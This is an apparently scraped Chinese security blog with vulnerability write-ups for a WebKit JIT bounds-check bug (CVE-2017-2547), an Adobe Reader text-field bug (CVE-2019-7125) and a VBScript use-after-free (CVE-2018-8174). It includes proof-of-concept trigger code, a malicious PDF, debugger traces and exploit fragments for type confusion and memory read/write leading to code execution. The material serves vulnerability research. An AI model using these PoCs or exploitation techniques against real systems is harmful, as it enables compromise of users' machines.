<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100000</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">parseInt</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    arr[<span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line">    arr[-<span class="number">0x12345678</span>] = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f();</span><br></pre></td></tr></table></figure>

<p> Tencent Team Sniper的poc</p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2017-2547%20%E5%88%86%E6%9E%90/15557298780096.jpg"></p>
<p>3.5448480588962e-310 就是  0x414141414140</p>
<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 : 前置知识"></a>0x01 : 前置知识</h2><p>DFG JIT :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DFG JIT 的使用前提是函数至少呗调用60次，或者循环执行至少1000次，或者2者同权值组合。</span><br></pre></td></tr></table></figure>




<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 : 分析"></a>0x02 : 分析</h2><p>问题发生在DFG JIT中，访问数组的时候因为缺少必要的边界检查，导致越界访问，当然这个洞可以转化成读/写内存，然后导致rce。</p>
<p>直接看代码：<br><code>git show f2476d46820b744450133f6b00a85e5265db1915</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">     RangeKind m_kind;</span><br><span class="line">@@ <span class="number">-249</span>,<span class="number">7</span> +<span class="number">258</span>,<span class="number">13</span> @@ <span class="keyword">private</span>:</span><br><span class="line">                     Node* maxNode;</span><br><span class="line"></span><br><span class="line">                     <span class="keyword">if</span> (!data.m_key.m_source) &#123;</span><br><span class="line">-                        minNode = <span class="number">0</span>;</span><br><span class="line">+                        <span class="comment">// data.m_key.m_source being null means that we&#x27;re comparing against int32 constants (see rangeKeyAndAddend()).</span></span><br><span class="line">+                        <span class="comment">// Since CheckInBounds does an unsigned comparison, if the minBound &gt;= 0, it is also covered by the</span></span><br><span class="line">+                        <span class="comment">// maxBound comparison. However, if minBound &lt; 0, then CheckInBounds should always fail its speculation check.</span></span><br><span class="line">+                        <span class="comment">// We&#x27;ll force an OSR exit in that case.</span></span><br><span class="line">+                        minNode = <span class="literal">nullptr</span>;</span><br><span class="line">+                        <span class="keyword">if</span> (range.m_minBound &lt; <span class="number">0</span>)</span><br><span class="line">+                            m_insertionSet.insertNode(nodeIndex, SpecNone, ForceOSRExit, node-&gt;origin);</span><br><span class="line">                         maxNode = m_insertionSet.insertConstant(</span><br><span class="line">                             nodeIndex, maxOrigin, jsNumber(range.m_maxBound));</span><br><span class="line">                     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">(END)</span><br></pre></td></tr></table></figure>
<p>这里看到的逻辑太少，直接去源码里找：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> ArrayBounds: &#123;</span><br><span class="line">    Node* minNode;</span><br><span class="line">    Node* maxNode;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!data.m_key.m_source) &#123;</span><br><span class="line">        <span class="comment">// data.m_key.m_source being null means that we&#x27;re comparing against int32 constants (see rangeKeyAndAddend()).</span></span><br><span class="line">        <span class="comment">// Since CheckInBounds does an unsigned comparison, if the minBound &gt;= 0, it is also covered by the</span></span><br><span class="line">        <span class="comment">// maxBound comparison. However, if minBound &lt; 0, then CheckInBounds should always fail its speculation check.</span></span><br><span class="line">        <span class="comment">// We&#x27;ll force an OSR exit in that case.</span></span><br><span class="line">        minNode = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span> (range.m_minBound &lt; <span class="number">0</span>)</span><br><span class="line">            m_insertionSet.insertNode(nodeIndex, SpecNone, ForceOSRExit, node-&gt;origin);</span><br><span class="line">        maxNode = m_insertionSet.insertConstant(</span><br><span class="line">            nodeIndex, maxOrigin, jsNumber(range.m_maxBound));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        minNode = insertAdd(</span><br><span class="line">            nodeIndex, minOrigin, data.m_key.m_source, range.m_minBound,</span><br><span class="line">            Arith::Unchecked);</span><br><span class="line">        maxNode = insertAdd(</span><br><span class="line">            nodeIndex, maxOrigin, data.m_key.m_source, range.m_maxBound,</span><br><span class="line">            Arith::Unchecked);</span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>
<p>这里是为了确定要访问的数组的边界，每次访问确定最大和最小值，为了后面消除冗余节点。（比如，多次访问这个array的时候，访问了10，又访问了20，那么代码做检查的时候肯定只会检测是不是大于20，而不会再检查是否大于10）。<br>在未patch的时候，边界检查的时Array的最小值是否是负数是没有做检测的，按照原来的逻辑：</p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2017-2547%20%E5%88%86%E6%9E%90/15557483590968.jpg"></p>
<p>如果如果min给个负数，那么后面的边界检查只有对max值的检查，也就是说这里可以给一个负的下标，从而造成越界访问。</p>
<p>那么PoC就很容易看懂了， 让js代码多次执行，make hot进入DFG JIT的优化流程，在访问数组时数组下标给一个负数，由于没有做边界检查，所以会导致越界读。</p>
<h2 id="0x03-Patch"><a href="#0x03-Patch" class="headerlink" title="0x03 : Patch"></a>0x03 : Patch</h2><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2017-2547%20%E5%88%86%E6%9E%90/15557474317852.jpg"></p>
<p>Patch代码的话，也很简单，增加了min是否是负数的检测，是的话就退出DFG优化，回退到更低一层的优化，去做更多的检查 ：）</p>
<h2 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 : Reference"></a>0x04 : Reference</h2><p><a href="https://www.thezdi.com/blog/2017/8/24/deconstructing-a-winning-webkit-pwn2own-entry">DECONSTRUCTING A WINNING WEBKIT PWN2OWN ENTRY</a></p>
<p><a href="https://sourcegraph.com/github.com/WebKit/webkit/-/blob/Source/JavaScriptCore/dfg/DFGIntegerCheckCombiningPhase.cpp#L240">source code</a></p>
<p><a href="https://www.jianshu.com/p/1a728e38ceaa">JavascriptCore四层结构</a></p>
<p><a href="https://github.com/tunz/js-vuln-db/blob/master/jsc/CVE-2017-2547.md">js-vuln-db</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>webkit</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-7125 PoC</title>
    <url>/2019/04/12/CVE-2019-7125-PoC/</url>
    <content><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>From Talos :<br><code>Adobe Acrobat Reader DC text field value remote code execution vulnerability — redux</code></p>
<a id="more"></a>


<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%PDF-1.5</span><br><span class="line"></span><br><span class="line">1 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">&#x2F;Kids</span><br><span class="line">  [&lt;&lt;</span><br><span class="line">  &#x2F;Annots</span><br><span class="line">    [&lt;&lt;</span><br><span class="line">    &#x2F;Subtype &#x2F;Text</span><br><span class="line">    &#x2F;Rect[0 0 0 0]</span><br><span class="line">    &#x2F;Subj (Hello World!)</span><br><span class="line">    &gt;&gt;</span><br><span class="line">    &lt;&lt;</span><br><span class="line">    &#x2F;Subtype &#x2F;Text</span><br><span class="line">    &#x2F;Rect[0 0 0 0]</span><br><span class="line">    &#x2F;Subj (Hello zzzWorld!)</span><br><span class="line">    &gt;&gt;]</span><br><span class="line">  &#x2F;Parent 1 0 R</span><br><span class="line">  &#x2F;Contents[3 0 R]</span><br><span class="line">  &gt;&gt;]</span><br><span class="line">  &#x2F;Resources&lt;&lt;&gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">%endobj</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3 0 obj&lt;&lt;&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">BT&#x2F;F1 105 Tf 0 400 Td(Adobe Reader)Tj ET</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">trailer</span><br><span class="line">&lt;&lt;</span><br><span class="line">&#x2F;Root</span><br><span class="line">  &lt;&lt;</span><br><span class="line">  &#x2F;AcroForm</span><br><span class="line">  &lt;&lt;</span><br><span class="line">    &#x2F;Fields</span><br><span class="line">      [</span><br><span class="line">      &lt;&lt;</span><br><span class="line">        &#x2F;Rect[10 10 10 10]</span><br><span class="line">        &#x2F;Subtype&#x2F;Widget</span><br><span class="line">        &#x2F;T(mytext)</span><br><span class="line">        &#x2F;V(this is a text)</span><br><span class="line">        &#x2F;FT&#x2F;Tx</span><br><span class="line">      &gt;&gt;</span><br><span class="line">      ]</span><br><span class="line">  &gt;&gt;</span><br><span class="line">  &#x2F;OpenAction</span><br><span class="line">    &lt;&lt;</span><br><span class="line">    &#x2F;S &#x2F;JavaScript</span><br><span class="line">    &#x2F;JS(</span><br><span class="line">        var r &#x3D; new RegExp(Array(32770).join(String.fromCharCode(24)));</span><br><span class="line">        this.getField(&#39;mytext&#39;)[&#39;value&#39;] &#x3D; r;</span><br><span class="line">		)</span><br><span class="line">    &gt;&gt;</span><br><span class="line">  &#x2F;Pages 1 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure>



<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.talosintelligence.com/vulnerability_reports/TALOS-2019-0774">TALOS-2019-0774</a></p>
]]></content>
      <categories>
        <category>PoC</category>
      </categories>
      <tags>
        <tag>PoC</tag>
        <tag>Adobe Reader</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2018-8174 analysis</title>
    <url>/2020/02/20/CVE-2018-8174-analysis/</url>
    <content><![CDATA[<h1 id="CVE-2018-8174"><a href="#CVE-2018-8174" class="headerlink" title="CVE-2018-8174"></a>CVE-2018-8174</h1><a id="more"></a>


<h2 id="Basic-Info"><a href="#Basic-Info" class="headerlink" title="Basic Info"></a>Basic Info</h2><p>利用ole加载IE的0day完成利用。</p>
<ul>
<li>win7 sp1 x86</li>
<li>vbscript version : 5.8.9600.17420</li>
</ul>
<h2 id="vuln-✅"><a href="#vuln-✅" class="headerlink" title="vuln ✅"></a>vuln ✅</h2><p>poc</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;x-ua-compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=10&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;vbscript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">Dim array_a</span><br><span class="line">Dim array_b(1)</span><br><span class="line"></span><br><span class="line">Class Trigger</span><br><span class="line">    Private Sub Class Terminate()</span><br><span class="line"><span class="javascript">        <span class="built_in">Set</span> array_b(<span class="number">0</span>) = array_a(<span class="number">1</span>)</span></span><br><span class="line">        array_a(1) = 1</span><br><span class="line">    End Sub</span><br><span class="line">End Class</span><br><span class="line"></span><br><span class="line">Sub UAF</span><br><span class="line">    ReDim array_a(1)</span><br><span class="line"><span class="javascript">    <span class="built_in">Set</span> array_a(<span class="number">1</span>) = New Trigger</span></span><br><span class="line">    Erase array_a</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub TriggerVuln</span><br><span class="line">    array_b(0) = 0</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub StartExploit</span><br><span class="line">    UAF</span><br><span class="line">    TriggerVuln</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">StartExploit</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15832345474144.jpg"></p>
<p>看起来是个UaF，结合poc来看：</p>
<ul>
<li>UAF函数里Redim了<code>array_a</code>，并且把它的值初始化为<code>Trigger</code>对象的一个实例，随后便删除了<code>array_a</code>对象</li>
<li><code>array_a</code>被删除的时候触发了Trigger的析构函数，这里面把<code>array_a(1)</code>赋值给<code>array_b(0)</code>，此时<code>array_b(0)</code>指向<code>Trigger</code>对象</li>
<li>随后<code>array_a(1)=1</code>是为了平衡引用计数，好获得一个野指针</li>
<li>随后的TriggerVuln函数里<code>array_b(0)</code>访问了已经释放的Trigger对象，导致UaF。</li>
</ul>
<p><strong>这个过程和之前看到的一些vbs的洞很像，都是一个模式。</strong></p>
<p>那么根据<code>!heap -p -a eax</code>的调用栈可以看到一个<code>!VbsErase+0x00000050</code>函数，这个应该是对应poc里的<code>Erase array_a</code>。</p>
<p>调用栈<code>k10</code>里看到的<code>vbscript!AssignVar</code> 应该对应<code>array_b(0) = 0</code>赋值语句。</p>
<p>Q:UaF的对象是？<br>A:VBScriptClass</p>
<p>Q:被释放对象的大小？<br>A:0x30<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15832495670898.jpg"><br>释放的时候，回调用这个对象的<code>VBScriptClass::Release</code>函数，在c++层vbs里的Trigger对象是VBScriptClass，释放的时候调用了Release函数，所以该对象的大小等信息，可以调这个函数。</p>
<p>释放前后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:007&gt; dd esi</span><br><span class="line">01848fd0  6b60206c 00000002 0184cf78 07d29f88</span><br><span class="line">01848fe0  00000b64 00000000 00000000 08864efc</span><br><span class="line">01848ff0  00000001 0865efe4 00000000 00000000</span><br><span class="line">01849000  ???????? ???????? ???????? ????????</span><br><span class="line">01849010  ???????? ???????? ???????? ????????</span><br><span class="line">01849020  ???????? ???????? ???????? ????????</span><br><span class="line">01849030  ???????? ???????? ???????? ????????</span><br><span class="line">01849040  ???????? ???????? ???????? ????????</span><br><span class="line">0:007&gt; !heap -p -a esi</span><br><span class="line">    address 01848fd0 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 1781000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                 8860ea0:          1848fd0               30 -          1848000             2000</span><br><span class="line">          vbscript!VBScriptClass::&#96;vftable&#39;</span><br><span class="line">    722c8e89 verifier!AVrfDebugPageHeapAllocate+0x00000229</span><br><span class="line">    77225ede ntdll!RtlDebugAllocateHeap+0x00000030</span><br><span class="line">    771ea40a ntdll!RtlpAllocateHeap+0x000000c4</span><br><span class="line">    771b5ae0 ntdll!RtlAllocateHeap+0x0000023a</span><br><span class="line">    77039d45 msvcrt!malloc+0x0000008d</span><br><span class="line">    7703b0d7 msvcrt!operator new+0x0000001d</span><br><span class="line">    6b629f0c vbscript!VBScriptClass::Create+0x00000014</span><br><span class="line">    6b629e97 vbscript!CScriptRuntime::RunNoEH+0x00002c78</span><br><span class="line">    6b60526e vbscript!CScriptRuntime::Run+0x000000c3</span><br><span class="line">    6b60518b vbscript!CScriptEntryPoint::Call+0x0000010b</span><br><span class="line">    6b62a12e vbscript!CScriptRuntime::RunNoEH+0x00002c23</span><br><span class="line">    6b60526e vbscript!CScriptRuntime::Run+0x000000c3</span><br><span class="line">    6b60518b vbscript!CScriptEntryPoint::Call+0x0000010b</span><br><span class="line">    6b6057cb vbscript!CScriptRuntime::RunNoEH+0x00001d74</span><br><span class="line">    6b60526e vbscript!CScriptRuntime::Run+0x000000c3</span><br><span class="line">    6b60518b vbscript!CScriptEntryPoint::Call+0x0000010b</span><br><span class="line">    6b6057cb vbscript!CScriptRuntime::RunNoEH+0x00001d74</span><br><span class="line">    6b60526e vbscript!CScriptRuntime::Run+0x000000c3</span><br><span class="line">    6b60518b vbscript!CScriptEntryPoint::Call+0x0000010b</span><br><span class="line">    6b6059bd vbscript!CSession::Execute+0x00000156</span><br><span class="line">    6b605c6b vbscript!COleScript::ExecutePendingScripts+0x0000014f</span><br><span class="line">    6b629138 vbscript!COleScript::ParseScriptTextCore+0x0000023e</span><br><span class="line">    6b60c3b9 vbscript!COleScript::ParseScriptText+0x00000029</span><br><span class="line">    6496f1e5 MSHTML!CActiveScriptHolder::ParseScriptText+0x00000051</span><br><span class="line">    64a05f3a MSHTML!CScriptCollection::ParseScriptText+0x00000177</span><br><span class="line">    6496fd65 MSHTML!CScriptData::CommitCode+0x00000332</span><br><span class="line">    6496f973 MSHTML!CScriptData::Execute+0x00000286</span><br><span class="line">    649707d4 MSHTML!CHtmScriptParseCtx::Execute+0x00000130</span><br><span class="line">    649e9a52 MSHTML!CHtmParseBase::Execute+0x00000196</span><br><span class="line">    6476b333 MSHTML!CHtmPost::Broadcast+0x00000153</span><br><span class="line">    6476b0ef MSHTML!CHtmPost::Exec+0x000005d9</span><br><span class="line">    64a078c8 MSHTML!CHtmPost::Run+0x0000003d</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">0:007&gt; g</span><br><span class="line">(b4c.b64): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax&#x3D;01848fd0 ebx&#x3D;72540fd0 ecx&#x3D;00000009 edx&#x3D;00000009 esi&#x3D;08658fe0 edi&#x3D;00000009</span><br><span class="line">eip&#x3D;759e4971 esp&#x3D;0479b7f0 ebp&#x3D;0479b7f8 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;001b  ss&#x3D;0023  ds&#x3D;0023  es&#x3D;0023  fs&#x3D;003b  gs&#x3D;0000             efl&#x3D;00010202</span><br><span class="line">OLEAUT32!VariantClear+0xb3:</span><br><span class="line">759e4971 8b08            mov     ecx,dword ptr [eax]  ds:0023:01848fd0&#x3D;????????</span><br></pre></td></tr></table></figure>

<h2 id="exploit-analysis"><a href="#exploit-analysis" class="headerlink" title="exploit analysis"></a>exploit analysis</h2><p>利用，找合适的对象占位，可以使用另一个<code>VBScriptClass</code>对象来占位，构造类型混淆去利用。</p>
<p>这个对象的结构:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">01848fd0  6b60206c 00000002 0184cf78 07d29f88</span><br><span class="line">            vtable  refcnt    NameTbl</span><br><span class="line">01848fe0  00000b64 00000000 00000000 08864efc</span><br><span class="line">01848ff0  00000001 0865efe4 00000000 00000000</span><br></pre></td></tr></table></figure>

<p>NameTbl对象保存的是这个对象的 成员变量和方法，这个对象可以被用来做利用，重点关注。</p>
<p>这个对象大小 0x88，NameTbl对象从+0×48开始保存成员变量和成员函数的指针</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NameList *__thiscall <span class="title">NameList::NameList</span><span class="params">(<span class="keyword">int</span> <span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  NameList *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">12</span>) = <span class="number">256</span>;</span><br><span class="line">  *(_DWORD *)<span class="keyword">this</span> = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">16</span>) = <span class="number">0x4000</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">52</span>) = <span class="keyword">this</span> + <span class="number">56</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">44</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">48</span>) = <span class="number">20</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">20</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">24</span>) = <span class="keyword">this</span> + <span class="number">20</span>;</span><br><span class="line">  result = (NameList *)<span class="keyword">this</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">32</span>) = <span class="number">15</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">28</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">36</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">40</span>) = <span class="number">64</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="UAF函数-✅"><a href="#UAF函数-✅" class="headerlink" title="UAF函数  ✅"></a>UAF函数  ✅</h3><p>两次0-6的循环之后，UafArrayA 和 UafArrayB<br>里面的7个元素都指向了释放的 ClassTerminateA/B对象。。<br>随后立即用 ReuseClass对象占位，此时7个引用都指向这个新的ReuseClass。。。<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15833047678730.jpg"></p>
<p>ClassTerminateA释放的时候:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:007&gt; dd 06776fd0  </span><br><span class="line">06776fd0  69a8206c 00000000 067cff78 07ebdf88</span><br><span class="line">06776fe0  000009c4 00000000 00000000 067d3efc</span><br><span class="line">06776ff0  00000000 07384fc4 00000000 067b0fd0</span><br><span class="line">06777000  ???????? ???????? ???????? ????????</span><br><span class="line">06777010  ???????? ???????? ???????? ????????</span><br><span class="line">06777020  ???????? ???????? ???????? ????????</span><br><span class="line">06777030  ???????? ???????? ???????? ????????</span><br><span class="line">06777040  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15833058568255.jpg"></p>
<p>调试发现并没有占位成功，需要调整exp的占位部分。</p>
<p>应该是有碎片，所以ClassTerminateA创建又释放的时候没有用同一块内存…</p>
<p><strong>后面发现是pageheap的问题，不能开pageheap。</strong></p>
<h3 id="TypeConfusion函数-✅"><a href="#TypeConfusion函数-✅" class="headerlink" title="TypeConfusion函数 ✅"></a>TypeConfusion函数 ✅</h3><p>resueObjectA_arr和resueObjectA_int setProp给成员mem赋值。。<br>赋值成ReplacingClass_Array和ReplacingClass_Int 自动触发了getter回调。。。</p>
<p>两个Getter回调里做的事差不多，</p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Class</span> ReplacingClass_Array</span><br><span class="line"><span class="keyword">Public</span> <span class="keyword">Default</span> <span class="keyword">Property</span> <span class="keyword">Get</span> Q</span><br><span class="line">	<span class="keyword">Dim</span> objectImitatingArray</span><br><span class="line">	Q=<span class="built_in">CDbl</span>(<span class="string">&quot;174088534690791e-324&quot;</span>)		<span class="comment">&#x27; db 0, 0, 0, 0, 0Ch, 20h, 0, 0</span></span><br><span class="line">	<span class="keyword">For</span> idx=<span class="number">0</span> <span class="keyword">To</span> <span class="number">6</span></span><br><span class="line">		UafArrayA(idx)=<span class="number">0</span></span><br><span class="line">	<span class="keyword">Next</span></span><br><span class="line">	<span class="keyword">Set</span> objectImitatingArray=<span class="keyword">New</span> FakeReuseClass</span><br><span class="line">	objectImitatingArray.mem = FakeArrayString</span><br><span class="line">	<span class="keyword">For</span> idx=<span class="number">0</span> <span class="keyword">To</span> <span class="number">6</span></span><br><span class="line">		<span class="keyword">Set</span> UafArrayA(idx)=objectImitatingArray</span><br><span class="line">	<span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Property</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Class</span></span><br></pre></td></tr></table></figure>

<p><code>ReuseClass.mem</code> 赋值为 <code>CDbl(&quot;174088534690791e-324&quot;)</code></p>
<p>随后释放了原本<code>UafArrayA</code>指向的内存，随后利用<br><code>Set objectImitatingArray=New FakeReuseClass</code>去占位，重新获取到原本对象的内存，此时就可以把 <code>ReuseClass</code>混淆成了<code>FakeReuseClass</code>对象。<br>之后 <code>objectImitatingArray.mem</code> 的赋值利用错位覆盖，伪造出了一个<code>Array</code>对象。</p>
<p>重点调试下这个混淆的过程：</p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15833192097066.jpg"></p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15833197765548.jpg"></p>
<p>两个地址分别是<code>1e7c720</code>和<code>1e82fa8</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:002&gt; dd 1e7c758 L4</span><br><span class="line">01e7c758  6b7e206c 00000007 01e7da70 01e79ef8</span><br><span class="line">0:002&gt; dd 01e7da70 + 0x34 L4</span><br><span class="line">01e7daa4  01e7daa8 01e81984 01e819b8 01e819f8</span><br><span class="line"></span><br><span class="line">0:002&gt; du 01e81984 +30</span><br><span class="line">01e819b4  &quot;p&quot;</span><br><span class="line">0:002&gt; du 01e819b8 +30</span><br><span class="line">01e819e8  &quot;SetProp&quot;</span><br><span class="line">0:002&gt; du 01e819f8+30</span><br><span class="line">01e81a28  &quot;mem&quot;</span><br></pre></td></tr></table></figure>

<p>类型混淆前</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:005&gt; dd 01e819f8 L4</span><br><span class="line">01e819f8  00000000 00500053 00000050 00000000</span><br></pre></td></tr></table></figure>

<p>混淆之后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:005&gt; dd 01e819f8 L4</span><br><span class="line">01e819f8  00000005 00000000 00000000 0000200c</span><br></pre></td></tr></table></figure>

<p>借用别人分析里的一个图</p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15833209544510.jpg"></p>
<p>这里的写是 在类型混淆的基础上，错位修改了成员类型。 (将VARIANT类型从String覆盖为Array)</p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15833209997788.jpg"></p>
<p>获得了一个 <code>0x7fffffff</code> 长的array用于读写内存。</p>
<h3 id="AAR-AAW-✅"><a href="#AAR-AAW-✅" class="headerlink" title="AAR/AAW ✅"></a>AAR/AAW ✅</h3><p>伪造的两个对象(+8)处的<code>NameList</code>对象是连续分配的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 第一个</span><br><span class="line">0:018&gt; dd 01bce438 L4</span><br><span class="line">01bce438  01bd2348 000000ac 00000100 00000100</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 第二个</span><br><span class="line">0:018&gt; dd 01bce558 L4</span><br><span class="line">01bce558  01bd2578 000000ac 00000100 00000100</span><br></pre></td></tr></table></figure>

<p>成员也是连续分配的，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:018&gt; dd 01bce438 +0x34 L4</span><br><span class="line">01bce46c  01bce470 01bd234c 01bd2380 01bd23c0</span><br><span class="line">0:018&gt; dd 01bce558 +0x34 L4</span><br><span class="line">01bce58c  01bce590 01bd257c 01bd25b0 01bd25f0</span><br></pre></td></tr></table></figure>

<p>所以可以利用这个特性，第一个对象为造成了一个0x7fffffff长度的array，</p>
<p>伪造的int对象的mem成员在<code>fakearray</code>的范围里，所以<code>int.mem</code>是一个fakearray里的地址，指向特定的元素，那么只要使用<code>fakearray[int.mem]</code>就可以任意地址读写。</p>
<p>下面是手写的记录</p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/3EC513EA-E9A4-4CAD-BD50-FB9B087A4173_1_105_c.jpeg" alt="3EC513EA-E9A4-4CAD-BD50-FB9B087A4173_1_105"></p>
<h3 id="RCE-✅"><a href="#RCE-✅" class="headerlink" title="RCE ✅"></a>RCE ✅</h3><p>写ROP+shellcode到可控的数组中，触发执行，rop修改内存属性并跳到shellcode去执行。</p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Sub</span> TriggerCodeExecution</span><br><span class="line">	resueObjectA_arr.mem(some_memory)=&amp;h4d</span><br><span class="line">	Wscript.Echo(<span class="string">&quot;GO&quot;</span>)</span><br><span class="line">	resueObjectA_arr.mem(some_memory+<span class="number">8</span>)=<span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>

<p>触发的时候，把这个元素的<code>VARIANT</code>类型修改为0x4d，随后<code>memClassA.mem(address + 8) = 0</code>触发了<code>AssignVar</code>函数。</p>
